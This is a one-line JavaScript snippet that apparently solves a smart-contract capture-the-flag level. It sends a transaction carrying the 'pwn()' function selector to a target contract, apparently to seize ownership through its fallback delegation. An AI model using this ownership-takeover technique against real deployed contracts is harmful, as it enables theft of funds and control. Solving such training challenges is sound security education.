```javascript
sendTransaction({from: player, to: contract.address, data: await web3.eth.abi.encodeFunctionSignature('pwn()')})
```